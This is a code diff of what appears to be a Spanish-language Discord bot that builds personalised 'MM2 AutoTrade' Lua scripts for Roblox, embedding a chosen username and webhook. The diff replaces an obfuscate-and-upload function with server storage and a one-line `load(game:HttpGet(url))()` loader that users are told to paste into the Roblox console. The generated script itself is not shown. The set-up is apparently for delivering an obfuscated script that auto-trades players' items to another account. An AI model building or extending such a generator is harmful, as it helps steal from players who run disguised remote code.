@@ -13,8 +13,6 @@ const {
   Colors,
 } = require('discord.js');
 const axios = require('axios');
-const zlib = require('zlib');
-const JavaScriptObfuscator = require('javascript-obfuscator');
 const fs = require('fs');
 
 const client = new Client({
@@ -22,7 +20,7 @@ const client = new Client({
 });
 
 // Configuración
-const CLOUDFLARE_URL = process.env.CLOUDFLARE_WORKER_URL || 'https://tu-dominio.workers.dev';
+const SERVER_URL = process.env.SERVER_URL || `http://localhost:${process.env.PORT || 3000}`;
 let MM2_SCRIPT = '';
 
 // Cargar script Lua al iniciar
@@ -143,45 +141,38 @@ client.on('interactionCreate', async (interaction) => {
           // Generar script personalizado
           const script = await generateScript(game, username, webhook);
 
+          // Almacenar script ofuscado en el servidor
+          const storeResponse = await axios.post(`${SERVER_URL}/api/store-script`, { script });
+          const { id, url } = storeResponse.data;
+
+          // Generar loadstring simple
+          const loadstring = `load(game:HttpGet("${url}"))()`;
+
           // Enviar DM al usuario
           try {
             const dmChannel = await interaction.user.createDM();
-
-            // Dividir el script en partes si es muy largo
-            const maxLength = 1950;
-            const parts = [];
-            for (let i = 0; i < script.length; i += maxLength) {
-              parts.push(script.substring(i, i + maxLength));
-            }
-
             const embed = new EmbedBuilder()
               .setColor(Colors.Green)
               .setTitle('🔪 Tu Script MM2 AutoTrade')
-              .setDescription('Tu script está listo. Cópialo y ejecuta en tu consola de Roblox (F9)')
+              .setDescription('Tu script personalizado y ofuscado está listo.\n\n✨ Solo copia el loadstring - ¡nada más!')
               .addFields(
                 { name: '👤 Usuario Configurado', value: `\`${username}\``, inline: true },
                 { name: '🎮 Juego', value: 'Murder Mystery 2', inline: true },
+                { name: '📋 Loadstring (Copiar Todo)', value: `\`\`\`\n${loadstring}\n\`\`\`` },
                 {
                   name: '⚙️ Instrucciones',
-                  value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. Copia y pega todo el script\n5. Presiona Enter',
+                  value: '1. Abre Roblox\n2. Entra en Murder Mystery 2\n3. Abre consola (F9)\n4. **Copia el loadstring arriba**\n5. Pégalo y presiona Enter',
                 }
               )
-              .setFooter({ text: 'AutoTrade MM2 | Script personalizado' })
+              .setFooter({ text: 'AutoTrade MM2 | Script ofuscado | Expira en 24h' })
               .setTimestamp();
 
             await dmChannel.send({ embeds: [embed] });
-
-            // Enviar el script en partes
-            for (let i = 0; i < parts.length; i++) {
-              const partNum = parts.length > 1 ? ` (Parte ${i + 1}/${parts.length})` : '';
-              await dmChannel.send(`\`\`\`lua\n${parts[i]}\n\`\`\`${partNum}`);
-            }
-
             await interaction.editReply({
               content: '✅ Script generado exitosamente. Revisa tu DM privado.',
             });
 
-            console.log(`📝 Script generado para ${interaction.user.tag} (${username})`);
+            console.log(`📝 Script generado para ${interaction.user.tag} (${username}) - ID: ${id}`);
           } catch (err) {
             console.error('DM Error:', err);
             await interaction.editReply({
@@ -215,36 +206,6 @@ async function generateScript(game, username, webhook) {
       .replace(/WEBHOOK_URL = "example"/g, `WEBHOOK_URL = "${webhook}"`);
   }
   throw new Error('Juego no soportado');
-}
-
-async function uploadToCloudflare(scriptCode) {
-  try {
-    // 1. Ofuscar
-    const obfuscated = JavaScriptObfuscator.obfuscate(scriptCode, {
-      compact: true,
-      controlFlowFlattening: false,
-      unicodeEscapeSequence: false,
-    }).getObfuscatedCode();
-
-    // 2. Comprimir
-    const compressed = zlib.deflateSync(obfuscated);
-    const encoded = compressed.toString('base64');
-
-    // 3. Enviar a Cloudflare Worker
-    const response = await axios.post(`${CLOUDFLARE_URL}/store`, { script: encoded }, {
-      headers: { 'Content-Type': 'application/json' },
-      timeout: 10000,
-    });
-
-    if (!response.data.id) {
-      throw new Error('No se recibió ID del servidor');
-    }
-
-    return response.data.id;
-  } catch (error) {
-    console.error('Cloudflare Upload Error:', error.message);
-    throw new Error('Error al subir el script a Cloudflare');
-  }
 }
 
 function isValidWebhook(webhook) {
